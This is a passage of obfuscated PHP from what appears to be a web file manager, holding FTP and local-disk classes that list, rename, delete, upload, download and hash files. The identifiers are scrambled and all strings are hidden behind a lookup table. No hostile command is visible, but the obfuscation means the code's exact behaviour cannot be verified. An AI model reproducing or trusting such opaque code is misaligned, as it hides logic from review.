$this->listItemCache = !0; foreach ($àÄÛºŞƒ as $ËğÚ®µ²) { $§ÀÚÉ» = $this->iconvSystem($ËğÚ®µ²[$_SERVER[”ú…±Ú¥][32]]); $àë¨ÆĞ = @ftp_delete($this->connect, $§ÀÚÉ»); if (!$àë¨ÆĞ) { return !1; } } foreach ($ŞÆÍ²éõ as $§ÀÚÉ») { $§ÀÚÉ» = $this->iconvSystem($§ÀÚÉ»); $àë¨ÆĞ = @ftp_rmdir($this->connect, $§ÀÚÉ»); if (!$àë¨ÆĞ) { return !1; } } $€Ë¸¤‘ = $this->iconvSystem($€Ë¸¤‘); return @ftp_rmdir($this->connect, $€Ë¸¤‘); } public function rename($ğå¡©Â, $ŸÑ÷ØÜğ) { $‡–ş—á =& $_SERVER[”ú…±Ú¥]; if (!$this->_isconn()) { return !1; } $‘³Š‚Ò = $this->fileNameAuto($this->pathFather($ğå¡©Â), $ŸÑ÷ØÜğ); $‘³Š‚Ò = $this->iconvSystem($‘³Š‚Ò); $ğå¡©Â = $this->iconvSystem($ğå¡©Â); $´â…§·ç = $this->pathFather($ğå¡©Â); $Øƒë¦Øè = rtrim($´â…§·ç, $‡–ş—á[8]) . $‡–ş—á[8] . $‘³Š‚Ò; $Ü¢÷á = @ftp_rename($this->connect, $ğå¡©Â, $Øƒë¦Øè); $Øƒë¦Øè = $this->iconvApp($Øƒë¦Øè); return $Ü¢÷á ? $this->getPathOuter($Øƒë¦Øè) : !1; } private function folderInfo($İ–—½ãº, $¥Ä•À¼• = false) { $å¸èáÙŒ =& $_SERVER[”ú…±Ú¥]; $àÆé—éÆ = array($å¸èáÙŒ[32] => $this->pathThis($İ–—½ãº), $å¸èáÙŒ[84] => $this->getPathOuter($å¸èáÙŒ[8] . $İ–—½ãº), $å¸èáÙŒ[33] => $å¸èáÙŒ[75]); if ($¥Ä•À¼•) { return $àÆé—éÆ; } $àÆé—éÆ[$å¸èáÙŒ[211]] = $àÆé—éÆ[$å¸èáÙŒ[85]] = 0; $àÆé—éÆ[$å¸èáÙŒ[212]] = $àÆé—éÆ[$å¸èáÙŒ[213]] = !0; return $àÆé—éÆ; } private function fileInfo($ÜÄüÕ¾è, $ÅæÖÅƒ = false, $ğÊä‹Éœ = array()) { $¨ÂÉ‡Ü =& $_SERVER[”ú…±Ú¥]; $õˆ­›‡ = array($¨ÂÉ‡Ü[32] => $this->pathThis($ÜÄüÕ¾è), $¨ÂÉ‡Ü[84] => $this->getPathOuter($¨ÂÉ‡Ü[8] . $ÜÄüÕ¾è), $¨ÂÉ‡Ü[33] => $¨ÂÉ‡Ü[210], $¨ÂÉ‡Ü[76] => isset($ğÊä‹Éœ[$¨ÂÉ‡Ü[76]]) ? $ğÊä‹Éœ[$¨ÂÉ‡Ü[76]] : 0, $¨ÂÉ‡Ü[174] => $this->ext($ÜÄüÕ¾è)); if ($ÅæÖÅƒ) { return $õˆ­›‡; } $õˆ­›‡[$¨ÂÉ‡Ü[211]] = $õˆ­›‡[$¨ÂÉ‡Ü[85]] = 0; $õˆ­›‡[$¨ÂÉ‡Ü[212]] = $õˆ­›‡[$¨ÂÉ‡Ü[213]] = !0; $¸éïÊÇ  = $this->iconvSystem($ÜÄüÕ¾è); $õˆ­›‡[$¨ÂÉ‡Ü[85]] = @ftp_mdtm($this->connect, $¸éïÊÇ ); if (empty($ğÊä‹Éœ)) { $ğÊä‹Éœ = $this->objectMeta($ÜÄüÕ¾è); if (!$ğÊä‹Éœ) { return $õˆ­›‡; } } $õˆ­›‡[$¨ÂÉ‡Ü[76]] = $ğÊä‹Éœ[$¨ÂÉ‡Ü[76]]; return $õˆ­›‡; } public function size($û¸³ñ»×) { $¨óĞÆ¡  = $this->objectMeta($û¸³ñ»×); return $¨óĞÆ¡  ? $¨óĞÆ¡ [$_SERVER[”ú…±Ú¥][76]] : 0; } public function info($ ÕÓüşà) { if ($this->isFile($ ÕÓüşà)) { return $this->fileInfo($ ÕÓüşà, 0); } else { if ($this->isFolder($ ÕÓüşà)) { return $this->folderInfo($ ÕÓüşà); } } return !1; } private function fileList($úµ¢†Ø, &$ØùÓÆ×á, &$õŠ½¤Ğ¬, $¬©Ô¹¨ = false) { $„Û¤»Ó¶ =& $_SERVER[”ú…±Ú¥]; $úµ¢†Ø = $this->iconvSystem($úµ¢†Ø); if (!$this->isFolder($úµ¢†Ø)) { return !1; } @ftp_chdir($this->connect, $„Û¤»Ó¶[8]); $úµ¢†Ø = rtrim($úµ¢†Ø, $„Û¤»Ó¶[8]) . $„Û¤»Ó¶[8]; check_abort(); $Öúİğ¥è = @ftp_rawlist($this->connect, $úµ¢†Ø); if (!$Öúİğ¥è) { $Öúİğ¥è = array(); } $İËĞæŸÃ = array($„Û¤»Ó¶[10] => 1, $„Û¤»Ó¶[1308] => 1); foreach ($Öúİğ¥è as $€ûÕÇÑ‡) { $¸€‚ïãâ = $this->_listItem($€ûÕÇÑ‡); if ($¸€‚ïãâ[0] == $„Û¤»Ó¶[790]) { continue; } $ÌÑ º¥ = $¸€‚ïãâ[8]; if (empty($ÌÑ º¥) && $ÌÑ º¥ !== $„Û¤»Ó¶[208] || isset($İËĞæŸÃ[$ÌÑ º¥])) { continue; } $ÌÑ º¥ = $this->iconvApp($úµ¢†Ø . ltrim($ÌÑ º¥, $„Û¤»Ó¶[8])); $¿Æ‚å¼ = array($„Û¤»Ó¶[32] => $ÌÑ º¥, $„Û¤»Ó¶[33] => $„Û¤»Ó¶[210], $„Û¤»Ó¶[76] => $¸€‚ïãâ[4]); if (substr($€ûÕÇÑ‡, 0, 1) == $„Û¤»Ó¶[1390]) { $¿Æ‚å¼[$„Û¤»Ó¶[33]] = $„Û¤»Ó¶[75]; $¿Æ‚å¼[$„Û¤»Ó¶[76]] = 0; } $òµú´Á¡ = $¿Æ‚å¼[$„Û¤»Ó¶[33]] == $„Û¤»Ó¶[75] ? !0 : !1; $this->cacheMethodInfoSet($ÌÑ º¥, $òµú´Á¡, $¿Æ‚å¼); if ($òµú´Á¡) { $ØùÓÆ×á[] = $ÌÑ º¥; if ($¬©Ô¹¨) { $this->fileList($ÌÑ º¥, $ØùÓÆ×á, $õŠ½¤Ğ¬, $¬©Ô¹¨); } continue; } $õŠ½¤Ğ¬[] = $¿Æ‚å¼; } $this->cacheMethodInfoSet($úµ¢†Ø, !0); } private function _listItem($ÑİŞ´”) { if (empty($ÑİŞ´”)) { return array(); } $†Ÿºø = preg_split($_SERVER[”ú…±Ú¥][1391], $ÑİŞ´”); if (count($†Ÿºø) <= 9) { return $†Ÿºø; } $†Ÿºø[8] = trim(substr($ÑİŞ´”, strpos($ÑİŞ´”, $†Ÿºø[7]) + strlen($†Ÿºø[7]))); return array_splice($†Ÿºø, 0, 9); } public function listPath($ÑËˆ‡¨, $şÏÇõ‚í = false) { $—‡›®âò =& $_SERVER[”ú…±Ú¥]; if (!$this->_isconn()) { return !1; } $âåœÆ—« = $Å®Ş÷ÕÚ = array(); $this->fileList($ÑËˆ‡¨, $âåœÆ—«, $Å®Ş÷ÕÚ); foreach ($âåœÆ—« as $‚ÖˆÏ => $ƒûÑİ×¡) { $âåœÆ—«[$‚ÖˆÏ] = $this->folderInfo($ƒûÑİ×¡, $şÏÇõ‚í); } foreach ($Å®Ş÷ÕÚ as $‚ÖˆÏ => $ƒûÑİ×¡) { $Å®Ş÷ÕÚ[$‚ÖˆÏ] = $this->fileInfo($ƒûÑİ×¡[$—‡›®âò[32]], $şÏÇõ‚í, $ƒûÑİ×¡); } return array($—‡›®âò[82] => $âåœÆ—«, $—‡›®âò[83] => $Å®Ş÷ÕÚ); } public function has($Ú¼äù¡Ç, $¦èÆ¹ = false, $ó­¡ûÏ¾ = true) { $ÏË«»¦Ñ =& $_SERVER[”ú…±Ú¥]; $Ÿ˜†ª¸â = $…‡Èä¥Å = array(); $´‹¾ÔÇ = $¦èÆ¹ ? !0 : !1; $this->fileList($Ú¼äù¡Ç, $Ÿ˜†ª¸â, $…‡Èä¥Å, $´‹¾ÔÇ); if ($¦èÆ¹) { return array($ÏË«»¦Ñ[217] => count($…‡Èä¥Å), $ÏË«»¦Ñ[218] => count($Ÿ˜†ª¸â)); } if ($ó­¡ûÏ¾) { if (count($…‡Èä¥Å)) { return !0; } } else { if (count($Ÿ˜†ª¸â)) { return !0; } } return !1; } public function listAll($Ëü¬ÁöØ) { $ğ™Şºü =& $_SERVER[”ú…±Ú¥]; if (!$this->_isconn()) { return !1; } $Œ»”º = $µšÙŸ€Ò = array(); $this->fileList($Ëü¬ÁöØ, $Œ»”º, $µšÙŸ€Ò, !0); $Üäêãàö = array_to_keyvalue($µšÙŸ€Ò, $ğ™Şºü[32]); foreach ($Œ»”º as $ø®®™âÏ) { if (is_string($ø®®™âÏ)) { $Üäêãàö[$ø®®™âÏ] = array($ğ™Şºü[76] => 0); } } return $this->listAllFiles($Ëü¬ÁöØ, $Üäêãàö); } public function getContent($ù¬œá¢‚) { if (!$this->_isconn()) { return !1; } $ù¬œá¢‚ = $this->iconvSystem($ù¬œá¢‚); return $this->fileSubstr($ù¬œá¢‚); } public function setContent($øì·µÃ¥, $¯Åƒ¼”¡ = '') { if (!$this->_isconn()) { return !1; } $°©¶¤´ò = $this->pathThis($this->iconvSystem($øì·µÃ¥)); $Á¶¿¶¹º = $this->tempFile($°©¶¤´ò); file_put_contents($Á¶¿¶¹º, $¯Åƒ¼”¡); $ø©å£ıÚ = $this->upload($øì·µÃ¥, $this->iconvApp($Á¶¿¶¹º)); $this->tempFileRemve($Á¶¿¶¹º); return $ø©å£ıÚ; } public function fileSubstr($ïÎúƒÑ¤, $°¦Ë°ÀÏ = 0, $Ş†˜é­ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ïÎúƒÑ¤, $°¦Ë°ÀÏ, $Ş†˜é­); } private function ftpRequest($ÀñÆó’, $¸€¨ãú = 0, $¶Ş¦­îá = false) { $ÀñÆó’ = $this->iconvSystem($ÀñÆó’); $ö²Áôß™ = $this->scheme . $this->host . $_SERVER[”ú…±Ú¥][4] . $this->port; $£Ä®œ È = curl_init(); curl_setopt($£Ä®œ È, CURLOPT_URL, $ö²Áôß™ . $this->pathEncode($ÀñÆó’)); curl_setopt($£Ä®œ È, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¶Ş¦­îá) { $ã ÔºÛ = $¸€¨ãú + $¶Ş¦­îá - 1; curl_setopt($£Ä®œ È, CURLOPT_RANGE, "{$¸€¨ãú}\x2d{$ã ÔºÛ}"); } curl_setopt($£Ä®œ È, CURLOPT_RETURNTRANSFER, 1); $Ñ×Ï›§É = curl_exec($£Ä®œ È); curl_close($£Ä®œ È); return $Ñ×Ï›§É; } public function upload($’™Ó†¨ù, $¶¾¸€Ñİ, $å•ôÂœ¾ = false, $Ì ±â–š = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($’™Ó†¨ù))) { return !1; } $’™Ó†¨ù = $this->iconvSystem($’™Ó†¨ù); $¶¾¸€Ñİ = $this->iconvSystem($¶¾¸€Ñİ); $õŸ„Ü• = ftp_nb_put($this->connect, $’™Ó†¨ù, $¶¾¸€Ñİ, FTP_BINARY); while ($õŸ„Ü• == FTP_MOREDATA) { $õŸ„Ü• = ftp_nb_continue($this->connect); } if ($õŸ„Ü• != FTP_FINISHED) { return !1; } return $this->getPathOuter($’™Ó†¨ù); } public function download($èõÙÑ—Š, $å§”²õÕ = '') { if (!$this->_isconn()) { return !1; } $ûË©‚í = $this->pathFather($å§”²õÕ); if (!IO::mkdir($ûË©‚í)) { return !1; } $èõÙÑ—Š = $this->iconvSystem($èõÙÑ—Š); $å§”²õÕ = $this->iconvSystem($å§”²õÕ); $„ˆá“”³ = ftp_nb_get($this->connect, $å§”²õÕ, $èõÙÑ—Š, FTP_BINARY); while ($„ˆá“”³ == FTP_MOREDATA) { $„ˆá“”³ = ftp_nb_continue($this->connect); } if ($„ˆá“”³ != FTP_FINISHED) { return !1; } return $this->iconvApp($å§”²õÕ); } public function exist($öí¿íğ) { return $this->isFile($öí¿íğ) || $this->isFolder($öí¿íğ); } public function isFile($•‚ûêÔÀ) { return !$this->isFolder($•‚ûêÔÀ) && $this->objectMeta($•‚ûêÔÀ); } public function isFolder($È·£Ÿ„) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][165], $È·£Ÿ„); } protected function objectMeta($—ª¦üª¡) { return $this->cacheMethod($_SERVER[”ú…±Ú¥][167], $—ª¦üª¡); } protected function _objectMeta($ÂíğÎ»è) { $ÔáÑ¿‘ =& $_SERVER[”ú…±Ú¥]; if ($ÂíğÎ»è == $ÔáÑ¿‘[12] || $ÂíğÎ»è == $ÔáÑ¿‘[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÂíğÎ»è = $this->iconvSystem($ÂíğÎ»è); $üŞ×ïÜ¼ = array($ÔáÑ¿‘[32] => $this->iconvApp($ÂíğÎ»è), $ÔáÑ¿‘[33] => $ÔáÑ¿‘[210], $ÔáÑ¿‘[76] => 0); @ftp_chdir($this->connect, $ÔáÑ¿‘[8]); $ÍÓÊƒ‡Ô = @ftp_size($this->connect, $ÂíğÎ»è); if ($ÍÓÊƒ‡Ô != -1) { $üŞ×ïÜ¼[$ÔáÑ¿‘[76]] = $ÍÓÊƒ‡Ô; } else { $§ª†’ê  = @ftp_chdir($this->connect, $ÂíğÎ»è); if (!$§ª†’ê ) { return !1; } $üŞ×ïÜ¼[$ÔáÑ¿‘[33]] = $ÔáÑ¿‘[75]; } return $üŞ×ïÜ¼; } protected function _isFolder($øÛÃş¯ß) { $‰ªÂÅ½Ñ =& $_SERVER[”ú…±Ú¥]; if ($øÛÃş¯ß == $‰ªÂÅ½Ñ[12] || $øÛÃş¯ß == $‰ªÂÅ½Ñ[8]) { return !0; } $êÜ»Í‘ù = $this->_objectMeta($øÛÃş¯ß); return isset($êÜ»Í‘ù[$‰ªÂÅ½Ñ[33]]) && $êÜ»Í‘ù[$‰ªÂÅ½Ñ[33]] == $‰ªÂÅ½Ñ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ÉâÄˆß‰) { if (substr($ÉâÄˆß‰, 0, 2) == $_SERVER[”ú…±Ú¥][1307]) { $ÉâÄˆß‰ = BASIC_PATH . substr($ÉâÄˆß‰, 2); } return $ÉâÄˆß‰; } public function iconvApp($¼‘×Ë“ø) { $†œ¢’€¨ =& $_SERVER[”ú…±Ú¥]; global $config; return $this->iconvTo($¼‘×Ë“ø, $config[$†œ¢’€¨[1382]], $config[$†œ¢’€¨[1381]]); } public function iconvSystem($ÜèÈ¯) { $¶ˆ…¤ĞÅ =& $_SERVER[”ú…±Ú¥]; global $config; return $this->iconvTo($ÜèÈ¯, $config[$¶ˆ…¤ĞÅ[1381]], $config[$¶ˆ…¤ĞÅ[1382]]); } public function getPathOuter($ê°–Âşñ) { $Äôô™± =& $_SERVER[”ú…±Ú¥]; $éš­à”’ = $this->iconvApp($this->pathBase); $ê°–Âşñ = $this->iconvApp($ê°–Âşñ); if (substr($éš­à”’, 0, 2) == $Äôô™±[1307]) { $éš­à”’ = BASIC_PATH . substr($éš­à”’, 2); } if (substr($ê°–Âşñ, 0, 2) == $Äôô™±[1307]) { $ê°–Âşñ = BASIC_PATH . substr($ê°–Âşñ, 2); } $éš­à”’ = KodIO::clear($éš­à”’); $ê°–Âşñ = KodIO::clear($ê°–Âşñ); $ê°–Âşñ = substr($ê°–Âşñ, strlen($éš­à”’)); if (empty($this->pathDriver)) { return $ê°–Âşñ; } return $this->pathDriver . $Äôô™±[8] . ltrim($ê°–Âşñ, $Äôô™±[8]); } public function mkfile($ÍŠœÏ¿À, $êÚ¿Ññö = '', $ÌˆÔÆ›ã = REPEAT_RENAME) { $ÍŠœÏ¿À = $this->iconvSystem($ÍŠœÏ¿À); @touch($ÍŠœÏ¿À); if ($êÚ¿Ññö) { file_put_contents($ÍŠœÏ¿À, $êÚ¿Ññö); } @chmod($ÍŠœÏ¿À, $this->pathAuth); return is_file($ÍŠœÏ¿À) ? $this->getPathOuter($ÍŠœÏ¿À) : !1; } public function mkdir($÷·™ˆ˜, $ğ¿óã’· = REPEAT_SKIP) { $÷·™ˆ˜ = $this->iconvSystem($÷·™ˆ˜); if (is_dir($÷·™ˆ˜)) { return $this->getPathOuter($÷·™ˆ˜); } @mkdir($÷·™ˆ˜, $this->pathAuth, !0); @chmod($÷·™ˆ˜, $this->pathAuth); return is_dir($÷·™ˆ˜) ? $this->getPathOuter($÷·™ˆ˜) : !1; } public function copyFile($ƒ®òšÆ¯, $¨«Ó†˜) { $this->mkdir($this->pathFather($¨«Ó†˜)); $ƒ®òšÆ¯ = $this->iconvSystem($ƒ®òšÆ¯); $¨«Ó†˜ = $this->iconvSystem($¨«Ó†˜); $åÔ»ÎŸ‚ = copy_64($ƒ®òšÆ¯, $¨«Ó†˜); @chmod($¨«Ó†˜, $this->pathAuth); return $åÔ»ÎŸ‚ ? $this->getPathOuter($¨«Ó†˜) : !1; } public function moveFile($Ğ›ÁÙ¶, $€ÒšÏšÆ) { $this->mkdir($this->pathFather($€ÒšÏšÆ)); $Ğ›ÁÙ¶ = $this->iconvSystem($Ğ›ÁÙ¶); $€ÒšÏšÆ = $this->iconvSystem($€ÒšÏšÆ); $ÖÓŞóø® = intval(@rename($Ğ›ÁÙ¶, $€ÒšÏšÆ)); if (!$ÖÓŞóø®) { if ($ÖÓŞóø® = intval(@copy_64($Ğ›ÁÙ¶, $€ÒšÏšÆ))) { @unlink($Ğ›ÁÙ¶); } } @chmod($€ÒšÏšÆ, $this->pathAuth); return $ÖÓŞóø® ? $this->getPathOuter($€ÒšÏšÆ) : !1; } public function movePath($±¾šûÕß, $Ù•µ­¿À, $½êÏÀ‡Ç = false) { $ğ§áÔƒü =& $_SERVER[”ú…±Ú¥]; $±¾šûÕß = $this->iconvSystem($±¾šûÕß); $Ù•µ­¿À = $this->iconvSystem($Ù•µ­¿À); $Ö¸»Üê° = rtrim($Ù•µ­¿À, $ğ§áÔƒü[8]) . $ğ§áÔƒü[8] . ($½êÏÀ‡Ç ? $½êÏÀ‡Ç : get_path_this($±¾šûÕß)); if (file_exists($Ö¸»Üê°)) { return !1; } $÷ÇßŞ = intval(@rename($±¾šûÕß, $Ö¸»Üê°)); $÷ÇßŞ = file_exists($Ö¸»Üê°); return $÷ÇßŞ ? $this->getPathOuter($Ö¸»Üê°) : !1; } public function delFile($±Ò¼²‰Ç) { $±Ò¼²‰Ç = $this->iconvSystem($±Ò¼²‰Ç); if (!@unlink($±Ò¼²‰Ç)) { @chmod($±Ò¼²‰Ç, $this->pathAuth); if (!@unlink($±Ò¼²‰Ç)) { return !1; } } else { return !0; } } public function delFolder($áïÂè˜É) { $©³ø¯òñ =& $_SERVER[”ú…±Ú¥]; $áïÂè˜É = $this->iconvSystem($áïÂè˜É); if (!is_dir($áïÂè˜É)) { return !0; } if (!($¦ÊÑ»ËÓ = opendir($áïÂè˜É))) { return !1; } while (($È’ä§ìË = readdir($¦ÊÑ»ËÓ)) !== !1) { if ($È’ä§ìË == $©³ø¯òñ[10] || $È’ä§ìË == $©³ø¯òñ[1308]) { continue; } $°ÇŸÛñÑ = $áïÂè˜É . $©³ø¯òñ[8] . $È’ä§ìË; if (is_file($°ÇŸÛñÑ) || is_link($°ÇŸÛñÑ)) { if (!unlink($°ÇŸÛñÑ)) { chmod($°ÇŸÛñÑ, $this->pathAuth); if (!unlink($°ÇŸÛñÑ)) { return !1; } } } else { if (is_dir($°ÇŸÛñÑ)) { chmod($°ÇŸÛñÑ, $this->pathAuth); $°ÇŸÛñÑ = $this->iconvApp($°ÇŸÛñÑ); if (!$this->delFolder($°ÇŸÛñÑ)) { return !1; } } } } closedir($¦ÊÑ»ËÓ); return rmdir($áïÂè˜É); } public function rename($À—“Óê, $şóÔÛ‚˜) { $…¢úî =& $_SERVER[”ú…±Ú¥]; $Ô©òƒ½ = $this->fileNameAuto($this->pathFather($À—“Óê), $şóÔÛ‚˜); $Ô©òƒ½ = $this->iconvSystem($Ô©òƒ½); $À—“Óê = $this->iconvSystem($À—“Óê); $îŠ±“­ú = $this->pathFather($À—“Óê); $—“ÈÈï = rtrim($îŠ±“­ú, $…¢úî[8]) . $…¢úî[8] . $Ô©òƒ½; $Èñ®¯Íß = @rename($À—“Óê, $—“ÈÈï); $—“ÈÈï = $this->iconvApp($—“ÈÈï); return $Èñ®¯Íß ? $this->getPathOuter($—“ÈÈï) : !1; } public function size($Æ‡ß¬…Ç) { $Æ‡ß¬…Ç = $this->iconvSystem($Æ‡ß¬…Ç); return filesize_64($Æ‡ß¬…Ç); } public function info($¡õãä®“) { $¡õãä®“ = $this->iconvSystem($¡õãä®“); if ($this->isFolder($¡õãä®“)) { return $this->folderInfo($¡õãä®“); } else { if ($this->isFile($¡õãä®“)) { return $this->fileInfo($¡õãä®“); } } return !1; } protected function infoChildren($€º£Õ–†, &$Ú÷½ÑÌ¤, $í—´úè = true) { $ ûØšÅ¢ =& $_SERVER[”ú…±Ú¥]; check_abort_echo(); $€º£Õ–† = rtrim($€º£Õ–†, $ ûØšÅ¢[8]) . $ ûØšÅ¢[8]; if ($í—´úè) { $€º£Õ–† = $this->iconvSystem($€º£Õ–†); } if (!($ÖÊÙ¼€ß = @opendir($€º£Õ–†))) { return; } while (($šÏº°ƒ† = readdir($ÖÊÙ¼€ß)) !== !1) { if ($šÏº°ƒ† == $ ûØšÅ¢[10] || $šÏº°ƒ† == $ ûØšÅ¢[1308]) { continue; } $±–¹½˜ = $€º£Õ–† . $šÏº°ƒ†; if (is_file($±–¹½˜) || is_link($±–¹½˜)) { $Ú÷½ÑÌ¤[$ ûØšÅ¢[77]]++; $Ú÷½ÑÌ¤[$ ûØšÅ¢[76]] += filesize_64($±–¹½˜); } else { if (is_dir($±–¹½˜)) { $Ú÷½ÑÌ¤[$ ûØšÅ¢[78]]++; $this->infoChildren($±–¹½˜, $Ú÷½ÑÌ¤, !1); } } } closedir($ÖÊÙ¼€ß); } private function folderInfo($Ÿ©¬ÂÃ, $ÕÆè²ÃÈ = false) { $˜á¥û£Í =& $_SERVER[”ú…±Ú¥]; $Ÿ©¬ÂÃ = rtrim($Ÿ©¬ÂÃ, $˜á¥û£Í[8]) . $˜á¥û£Í[8]; $‡÷Ùğã = $this->iconvApp($this->pathThis($Ÿ©¬ÂÃ)); if ($ÕÆè²ÃÈ) { return array($˜á¥û£Í[32] => $‡÷Ùğã, $˜á¥û£Í[84] => $this->getPathOuter($Ÿ©¬ÂÃ), $˜á¥û£Í[33] => $˜á¥û£Í[75]); } $–÷µÂ…– = array($˜á¥û£Í[32] => $‡÷Ùğã, $˜á¥û£Í[84] => $this->getPathOuter($Ÿ©¬ÂÃ), $˜á¥û£Í[33] => $˜á¥û£Í[75], $˜á¥û£Í[211] => @filectime($Ÿ©¬ÂÃ), $˜á¥û£Í[85] => @filemtime($Ÿ©¬ÂÃ), $˜á¥û£Í[1392] => @fileatime($Ÿ©¬ÂÃ), $˜á¥û£Í[1393] => is_readable($Ÿ©¬ÂÃ), $˜á¥û£Í[1394] => is_writable($Ÿ©¬ÂÃ), $˜á¥û£Í[1395] => get_mode($Ÿ©¬ÂÃ)); return $–÷µÂ…–; } private function fileInfo($–˜½øà£, $„Àòş£ş = false) { $˜Áûˆ· =& $_SERVER[”ú…±Ú¥]; $Õİ©ç¡Ö = $this->iconvApp($this->pathThis($–˜½øà£)); if ($„Àòş£ş) { return array($˜Áûˆ·[32] => $Õİ©ç¡Ö, $˜Áûˆ·[84] => $this->getPathOuter($–˜½øà£), $˜Áûˆ·[33] => $˜Áûˆ·[210], $˜Áûˆ·[76] => $this->size($–˜½øà£), $˜Áûˆ·[174] => $this->ext($Õİ©ç¡Ö)); } $î‹×Ô´­ = array($˜Áûˆ·[32] => $Õİ©ç¡Ö, $˜Áûˆ·[84] => $this->getPathOuter($–˜½øà£), $˜Áûˆ·[33] => $˜Áûˆ·[210], $˜Áûˆ·[211] => @filectime($–˜½øà£), $˜Áûˆ·[85] => @filemtime($–˜½øà£), $˜Áûˆ·[1392] => @fileatime($–˜½øà£), $˜Áûˆ·[76] => $this->size($–˜½øà£), $˜Áûˆ·[174] => $this->ext($Õİ©ç¡Ö), $˜Áûˆ·[1393] => is_readable($–˜½øà£), $˜Áûˆ·[1394] => is_writable($–˜½øà£), $˜Áûˆ·[1395] => get_mode($–˜½øà£)); return $î‹×Ô´­; } public function exist($’É‹”Ë) { $’É‹”Ë = $this->iconvSystem($’É‹”Ë); return @file_exists($’É‹”Ë); } public function isFile($Ï÷†ÍŠ˜) { $Ï÷†ÍŠ˜ = $this->iconvSystem($Ï÷†ÍŠ˜); return @is_file($Ï÷†ÍŠ˜); } public function isFolder($×—’¶…) { $×—’¶… = $this->iconvSystem($×—’¶…); return @is_dir($×—’¶…); } public function listPath($çÒ¿», $ÜÅÈ‘„ˆ = false) { $Áñ –é =& $_SERVER[”ú…±Ú¥]; $çÒ¿» = $this->iconvSystem($çÒ¿»); $çÒ¿» = rtrim($çÒ¿», $Áñ –é[8]) . $Áñ –é[8]; $ÇÜõ ğ = array($Áñ –é[82] => array(), $Áñ –é[83] => array()); if (!($îµî“Óü = @opendir($çÒ¿»))) { return $ÇÜõ ğ; } while (($ß¬®Í‘ = readdir($îµî“Óü)) !== !1) { if ($ß¬®Í‘ == $Áñ –é[10] || $ß¬®Í‘ == $Áñ –é[1308]) { continue; } $úÔ³ùà¢ = $çÒ¿» . $ß¬®Í‘; if (is_file($úÔ³ùà¢)) { $ÇÜõ ğ[$Áñ –é[83]][] = $this->fileInfo($úÔ³ùà¢, $ÜÅÈ‘„ˆ); } else { $ÇÜõ ğ[$Áñ –é[82]][] = $this->folderInfo($úÔ³ùà¢, $ÜÅÈ‘„ˆ); } } closedir($îµî“Óü); return $ÇÜõ ğ; } public function listAll($à¦Ïæ¯Ê, &$¢¬œĞ¡× = array()) { $©Ñºµª© =& $_SERVER[”ú…±Ú¥]; $à¦Ïæ¯Ê = $this->iconvSystem($à¦Ïæ¯Ê); $à¦Ïæ¯Ê = rtrim($à¦Ïæ¯Ê, $©Ñºµª©[8]) . $©Ñºµª©[8]; if (!($õÛ¾¢˜“ = @opendir($à¦Ïæ¯Ê))) { return $¢¬œĞ¡×; } while (($ÕÀ…ÍÏ = readdir($õÛ¾¢˜“)) !== !1) { if ($ÕÀ…ÍÏ == $©Ñºµª©[10] || $ÕÀ…ÍÏ == $©Ñºµª©[1308]) { continue; } $â÷â¸î = $à¦Ïæ¯Ê . $ÕÀ…ÍÏ; $Èğ‚ôÄ = is_dir($â÷â¸î) && !is_link($â÷â¸î) ? 1 : 0; $â÷â¸î = $Èğ‚ôÄ ? $â÷â¸î . $©Ñºµª©[8] : $â÷â¸î; $¢¬œĞ¡×[] = array($©Ñºµª©[84] => $â÷â¸î, $©Ñºµª©[75] => $Èğ‚ôÄ, $©Ñºµª©[85] => intval(@filemtime($â÷â¸î)), $©Ñºµª©[76] => $Èğ‚ôÄ ? 0 : intval($this->size($â÷â¸î))); if ($Èğ‚ôÄ) { $this->listAll($â÷â¸î, $¢¬œĞ¡×); } } closedir($õÛ¾¢˜“); return $¢¬œĞ¡×; } public function has($„©«ƒü, $“øÊİÔ€ = false, $±‚ıœŞ = true) { $›ıÂ³‚æ =& $_SERVER[”ú…±Ú¥]; $„©«ƒü = $this->iconvSystem($„©«ƒü); $„©«ƒü = rtrim($„©«ƒü, $›ıÂ³‚æ[8]) . $›ıÂ³‚æ[8]; if (!($¢êÂåŞ = @opendir($„©«ƒü))) { return !1; } $ù˜ÊŒ’ = 0; $ñÏïˆõú = 0; $¢°ğÏÀ¸ = 0; while (($Û‰êü = readdir($¢êÂåŞ)) !== !1) { if ($Û‰êü == $›ıÂ³‚æ[10] || $Û‰êü == $›ıÂ³‚æ[1308]) { continue; } $‰š€Èú· = $„©«ƒü . $Û‰êü; if ($“øÊİÔ€) { $¢°ğÏÀ¸++; if (@is_file($‰š€Èú·)) { $ù˜ÊŒ’++; } else { $ñÏïˆõú++; } if ($¢°ğÏÀ¸ > 10000) { break; } continue; } if ($±‚ıœŞ) { if (@is_file($‰š€Èú·)) { return !0; } } else { if (@is_dir($‰š€Èú· . $›ıÂ³‚æ[8])) { return !0; } } } closedir($¢êÂåŞ); if ($“øÊİÔ€) { return array($›ıÂ³‚æ[217] => $ù˜ÊŒ’, $›ıÂ³‚æ[218] => $ñÏïˆõú); } return !1; } public function hashSimple($ò°ŸÜ¦§) { $¢ß¢®¶Ê =& $_SERVER[”ú…±Ú¥]; if (!$ò°ŸÜ¦§) { return md5($¢ß¢®¶Ê[12]); } $ò°ŸÜ¦§ = $this->iconvSystem($ò°ŸÜ¦§); $àë¼Şí = $this->size($ò°ŸÜ¦§); $ÃœÀğšÖ = 200; $çÔáÁÖş = 50; if ($àë¼Şí <= $ÃœÀğšÖ * $çÔáÁÖş) { return $this->hashMd5($ò°ŸÜ¦§) . $àë¼Şí; } $ŸÊ’¯² = $¢ß¢®¶Ê[12]; $…Ş€ëÍ = intval($àë¼Şí / $çÔáÁÖş); $­ŞÀ˜Å† = fopen($ò°ŸÜ¦§, $¢ß¢®¶Ê[1396]); if (!$­ŞÀ˜Å†) { return $ŸÊ’¯²; } for ($ŒÖ·Æõò = 0; $ŒÖ·Æõò < $çÔáÁÖş; $ŒÖ·Æõò++) { fseek_64($­ŞÀ˜Å†, $…Ş€ëÍ * $ŒÖ·Æõò); $ŸÊ’¯² .= fread($­ŞÀ˜Å†, $ÃœÀğšÖ); } fseek_64($­ŞÀ˜Å†, 